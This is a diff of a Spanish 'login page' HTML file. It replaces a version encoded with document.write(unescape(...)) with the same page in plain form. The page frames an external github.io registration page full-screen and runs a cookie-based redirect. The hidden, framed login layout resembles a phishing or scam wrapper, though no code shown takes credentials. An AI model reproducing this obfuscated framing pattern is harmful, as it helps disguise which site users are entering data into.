@@ -1,5 +1,55 @@
-<script>
-<!--
-document.write(unescape("%3C%21DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22es%22%3E%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%0A%20%20%20%20%3Ctitle%3EP%E1gina%20de%20Login%3C/title%3E%0A%20%20%20%20%3Cstyle%3E%0A%20%20%20%20%20%20%20%20body%2C%20html%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin%3A%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20padding%3A%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20height%3A%20100%25%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20overflow%3A%20hidden%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20iframe%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20height%3A%20100%25%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20border%3A%20none%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%3C/style%3E%0A%3C/head%3E%0A%3Cbody%3E%0A%20%20%20%20%3Ciframe%20src%3D%22https%3A//taskvip943.github.io/register.html%22%3E%3C/iframe%3E%0A%0A%20%20%20%20%3Cscript%3E%0A%20%20%20%20%20%20%20%20document.cookie%20%3D%20%22lastVisitedPage%3D%22%20+%20window.location.href%20+%20%22%3B%20path%3D/%22%3B%0A%0A%20%20%20%20%20%20%20%20function%20getLastVisitedPage%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20name%20%3D%20%22lastVisitedPage%3D%22%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20decodedCookie%20%3D%20decodeURIComponent%28document.cookie%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20ca%20%3D%20decodedCookie.split%28%27%3B%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20for%20%28let%20i%20%3D%200%3B%20i%20%3C%20ca.length%3B%20i++%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20let%20c%20%3D%20ca%5Bi%5D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20while%20%28c.charAt%280%29%20%3D%3D%3D%20%27%20%27%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20c%20%3D%20c.substring%281%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28c.indexOf%28name%29%20%3D%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20c.substring%28name.length%2C%20c.length%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%22%22%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20window.onload%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20lastPage%20%3D%20getLastVisitedPage%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20%28lastPage%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.location.href%20%3D%20lastPage%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%3B%0A%20%20%20%20%3C/script%3E%0A%3C/body%3E%0A%3C/html%3E"));
-//-->
-</script>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página de Login</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <iframe src="https://taskvip943.github.io/register.html"></iframe>
+
+    <script>
+        // Guardar la URL actual en una cookie al cargar la página
+        document.cookie = "lastVisitedPage=" + window.location.href + "; path=/";
+
+        // Recuperar la URL de la cookie
+        function getLastVisitedPage() {
+            const name = "lastVisitedPage=";
+            const decodedCookie = decodeURIComponent(document.cookie);
+            const ca = decodedCookie.split(';');
+            for (let i = 0; i < ca.length; i++) {
+                let c = ca[i];
+                while (c.charAt(0) === ' ') {
+                    c = c.substring(1);
+                }
+                if (c.indexOf(name) === 0) {
+                    return c.substring(name.length, c.length);
+                }
+            }
+            return "";
+        }
+
+        // Manejar la redirección si es necesario
+        window.onload = function() {
+            const lastPage = getLastVisitedPage();
+            if (lastPage && lastPage !== window.location.href) {
+                // Solo redirigir si es diferente de la página actual
+                window.location.href = lastPage;
+            }
+        };
+    </script>
+</body>
+</html>
